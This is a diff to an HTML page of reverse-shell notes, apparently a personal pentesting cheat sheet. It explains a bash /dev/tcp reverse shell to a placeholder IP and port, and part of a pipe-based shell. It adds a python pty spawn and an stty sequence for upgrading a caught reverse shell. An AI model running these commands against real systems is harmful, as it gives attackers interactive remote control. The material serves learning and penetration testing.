@@ -14,7 +14,7 @@
     <ul>
         <li><code>$ bash -c 'bash -i >& /dev/tcp/IP/Port 0>&1'
             </code> <br><br>
-            > bash -c: allows to execute a single command or a string of commands provided as an argument.
+            > bash -c: allows to execute a single command or a string of commands provided as an argument. <br>
             > bash -i: Starts an interactive shell. <br>
             > '>&': redirects stdout and stderr to the TCP connection <br>
             > '0>&1': input from the attacker's machine is sent to the interactive shell.
@@ -41,6 +41,21 @@
             > '> /tmp/f': Writes incoming commands from the attacker back into the pipe for execution by the shell.
             <br><br></li>
     </ul>
+    <ul>
+        <li><code>$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+            </code> <br><br>
+            > upgrade a basic reverse shell into a more functional interactive shell
+            <br><br></li>
+    </ul>
+    <ul>
+        <li><code>$ stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+            </code> <br><br>
+            > Improving the interaction with a reverse shell. <br>
+            > Fixing common terminal issues (e.g., no terminal features like backspace or resizing). <br>
+            > Making the shell environment behave more like a regular, fully-functional terminal.
+            <br><br></li>
+    </ul>
+    
 
     <button onclick="goBack()">Back</button>
     <script src="note.js"></script>
